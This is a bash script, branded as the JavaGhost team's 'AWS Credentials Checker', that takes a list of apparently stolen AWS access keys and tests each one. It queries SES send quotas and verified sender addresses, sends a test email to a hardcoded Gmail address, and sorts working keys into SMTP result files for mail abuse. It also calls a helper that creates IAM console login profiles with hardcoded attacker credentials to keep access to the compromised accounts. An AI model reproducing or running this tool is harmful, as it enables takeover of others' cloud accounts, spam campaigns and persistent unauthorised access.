# !/bin/bash
# Contact : https://fb.me/n00b.me - https://t.me/noolep

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# required file
source files/Convert_SMTP
source files/Create_login

# for recive test email [ if found aws smtp work to send - change this if u want ]
TO_MAIL="wehatetherules@gmail.com"

# auth for login to amazon console
console_user="LazyBoy"
console_pass="Java#Gh0st"

# check depen
depen=("curl" "openssl" "aws")
for pckg in "${depen[@]}"; do
    command -v $pckg >/dev/null 2>&1 || {
        echo -e >&2 "${white}[ ${red}- ${white}] ${white}$pckg ${blue}: ${red}NOT INSTALLED${white}"
        exit
    }
done

# create dir + config awscli [ for user never run awscli ]
if [[ -d ~/.aws ]] && [[ -d Results ]]; then
	touch response_out.tmp response_send.tmp
	touch Results/SMTP_GOOD.txt
	touch Results/SMTP_BAD.txt
	touch Results/CONSOLE_ACCOUNT.txt
	touch Results/CAN_ACCESS_IAM.txt
else
	mkdir ~/.aws Results &> /dev/null
	touch ~/.aws/config ~/.aws/credentials
	echo -e "[default]\nregion = indonesian-people\noutput = json" > ~/.aws/config
	echo -e "[default]\naws_access_key_id = LazyBoy\naws_secret_access_key = JavaGhostTeam" > ~/.aws/credentials
fi

# banner
echo -e "${yellow}\t █████╗ ██╗    ██╗ ██████╗██████╗ ███████╗ ██████╗${white}"
echo -e "${yellow}\t██╔══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝${white}"
echo -e "${yellow}\t███████║██║ █╗ ██║██║     ██████╔╝█████╗  ██║     ${white}"
echo -e "${yellow}\t██╔══██║██║███╗██║██║     ██╔══██╗██╔══╝  ██║     ${white}"
echo -e "${yellow}\t██║  ██║╚███╔███╔╝╚██████╗██║  ██║███████╗╚██████╗${white}"
echo -e "${yellow}\t╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝${white}"
echo -e "${white}   [ ${green}AWS Credentials Checker ${blue}- ${green}By ${blue}: ${green}./LazyBoy ${blue}- ${green}JavaGhost Team ${white}]\n"

# ask file + check
echo -e "${white}[ ${red}INFO ${white}] ${blue}- ${red}ONLY INPUT LIST WITH FORMAT LIKE THIS ${blue}: ${green}AWS_KEY|AWS_SEC|AWS_REG${white}"
read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] Input AWS Credentials List \e[1;34m: \e[1;32m' ask_lst

if [[ ! -e $ask_lst ]]; then
	echo -e "${white}[ ${red}ERROR ${white}] ${blue}- ${red}FILE NOT FOUND IN YOUR DIRECTORY${white}"
	exit
else
	echo -e "${white}[ ${green}? ${white}] Total AWS Credentials in ${green}${ask_lst} ${blue}: ${green}$(< $ask_lst wc -l)\n${white}"
fi

# execute script
for aws_cred in $(cat $ask_lst); do
    # configure config + credentials awscli
    sed -i "2c aws_access_key_id = $(echo $aws_cred | cut -d "|" -f1)" ~/.aws/credentials
    sed -i "3c aws_secret_access_key = $(echo $aws_cred | cut -d "|" -f2)" ~/.aws/credentials
    sed -i "2c region = $(echo $aws_cred | cut -d "|" -f3)" ~/.aws/config

	# check info aws credentials [ work or not ]
	check_aws_cred=$(aws ses get-send-quota &> response_out.tmp ; cat response_out.tmp | grep -o "Max24HourSend\|InvalidClientTokenId\|AccessDenied\|SignatureDoesNotMatch")

	if [[ $check_aws_cred == "Max24HourSend" ]]; then
		# var for get Max24HourSend + SentLast24Hours + FM ( FROM MAIL )
		LIMIT_SEND=$(aws ses get-send-quota | grep -oP '"Max24HourSend": \K[^,]+')
		ALREADY_USED=$(aws ses get-send-quota | grep -oP '"SentLast24Hours": \K[^,]+')
		FROM_MAIL=$(aws ses list-identities | grep -oP '".*?\K[^"]+' | grep "@" | head -n1)

		# check fm + check send		
		if [[ $(aws ses list-identities | grep -o "@" | head -n1) == "@" ]]; then
			echo -e "${white}[ ${green}GOOD ${white}] ${blue}- ${green}${aws_cred}${white}"
			echo -e "${white}[ ${green}+ ${white}] LIMIT ${blue}: ${green}${LIMIT_SEND} ${blue}- ${white}USED ${blue}: ${green}${ALREADY_USED}${white}"
			echo -e "${white}[ ${green}+ ${white}] FROM MAIL ${blue}: ${green}${FROM_MAIL}${white}"
			echo -e "${white}[ ${green}? ${white}] ${yellow}TRYING CHECK SEND TO ${blue}: ${green}${TO_MAIL}${white}"
			check_send=$(aws ses send-email --from "${FROM_MAIL}" --destination "ToAddresses=$TO_MAIL" --message "Subject={Data=from JavaGhost,Charset=utf8},Body={Text={Data=JavaGhost - AWS SMTP TESTER BY : ./LazyBoy ,Charset=utf8}}" &> response_send.tmp ; cat response_send.tmp | grep -o "MessageRejected\|MessageId")
			if [[ $check_send == "MessageRejected" ]]; then
				Convert_to_SMTP SUSPEND >> Results/SMTP_BAD.txt
				echo -e "${white}[ ${red}- ${white}] ${red}SENDING PAUSED${white}"
				AWS_Create_Login_Profile
			elif [[ $check_send == "MessageId" ]]; then
				Convert_to_SMTP WORK >> Results/SMTP_GOOD.txt
				echo -e "${white}[ ${green}+ ${white}] ${green}WORK FOR SEND${white}"
				AWS_Create_Login_Profile
			fi
		else
			echo -e "${white}[ ${green}GOOD ${white}] ${blue}- ${green}${aws_cred}${white}"
			echo -e "${white}[ ${green}+ ${white}] LIMIT ${blue}: ${green}${LIMIT_SEND} ${blue}- ${white}USED ${blue}: ${green}${ALREADY_USED}${white}"
			echo -e "${white}[ ${red}! ${white}] ${red}CANT GET FM ${blue}- ${red}SKIPPED FOR CONVERT TO SMTP${white}"
			AWS_Create_Login_Profile
		fi

	elif [[ $check_aws_cred == "InvalidClientTokenId" ]]; then
		echo -e "${white}[ ${red}INVALID KEY ${white}] ${blue}- ${red}${aws_cred}\n${white}"
	elif [[ $check_aws_cred == "AccessDenied" ]]; then
		echo -e "${white}[ ${red}ACCESS DENIED ${white}] ${blue}- ${red}${aws_cred} ${blue}: ${white}CANT ACCESS ${yellow}\e[4mAWS SES\e[0m\n${white}[ ${green}? ${white}] CHECKING ACCESS ${yellow}\e[4mAWS IAM\e[0m${white}"
		AWS_Create_Login_Profile
	elif [[ $check_aws_cred == "SignatureDoesNotMatch" ]]; then
		echo -e "${white}[ ${red}ERROR SIGNATURE ${white}] ${blue}- ${red}${aws_cred}\n${white}"
	else
		echo -e "${white}[ ${red}UNKNOWN ERROR ${white}] ${blue}- ${red}${aws_cred}\n${white}"
	fi
done
# end

echo -e "${white}[ ${green}? ${white}] ${green}ALL FILE SAVED IN ${blue}: ${green}$(pwd)/Results${white}"
rm *.tmp*
